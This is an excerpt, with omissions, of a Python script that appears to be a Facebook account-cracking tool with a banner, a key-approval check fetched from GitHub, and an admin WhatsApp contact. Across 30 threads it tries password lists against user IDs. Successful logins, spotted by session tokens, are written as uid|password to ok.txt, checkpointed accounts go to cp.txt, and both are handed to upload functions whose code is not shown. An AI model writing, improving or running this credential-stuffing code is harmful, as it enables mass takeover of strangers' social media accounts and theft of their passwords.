...
def helpnote():
	...
	exit(" [*] FACEBOOK :  https://www.facebook.com/mdnx.himel32")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> 01601161609")
	subprocess.check_output(["am", "start", "https://wa.me/01601161609"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/KINGHIMEL32/APROVEAL/main/Approved.txt').text
			if basesplit in plr:
				key = basesplit
		...
		print ("""\033[1;91m                      ─━㋱ASSALAMUALAIKUM㋱━─ 
  \033[1;90m                         
  \033[1;91m
  \033[1;91m   ##     ##  ##  ##         ## ###### ##      
  \033[1;92m   ##     ##  ##  ####     #### ##     ##       
  ...
  [∆]\033[1;92m   Virson   : KH32.0.19     
	...
	def fbtua(self):
		...
		try:
			...
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 2 SECONDS\x1b[0m\n"%(R))
				for user in self.id:
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [HIMEL] : %s/%s -> \033[0;92m [ HIMEL-OK:%s ]- \033[0;93m[HIMEL-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[HIMEL-OKðŸ˜] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [HIMRL-OKðŸ˜] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[HIMEL-CPðŸ˜­] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [HIMEL-CPðŸ˜­] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
